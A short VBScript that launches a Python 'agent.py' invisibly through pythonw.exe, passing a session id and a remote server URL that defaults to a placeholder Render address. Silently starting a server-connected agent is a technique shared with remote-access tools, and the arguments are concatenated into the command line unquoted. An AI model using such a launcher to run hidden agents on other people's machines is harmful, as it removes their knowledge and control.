' Launch the vomit agent with no visible window.
' Usage: wscript run_hidden.vbs <session-id> [server-url]

Set args = WScript.Arguments
If args.Count < 1 Then
    MsgBox "Usage: run_hidden.vbs <session-id> [server-url]"
    WScript.Quit 1
End If

sessionId = args(0)
If args.Count >= 2 Then
    serverUrl = args(1)
Else
    serverUrl = "https://your-app.onrender.com"
End If

Set sh = CreateObject("WScript.Shell")
sh.Run "pythonw.exe ""agent.py"" --session " & sessionId & " --server " & serverUrl, 0, False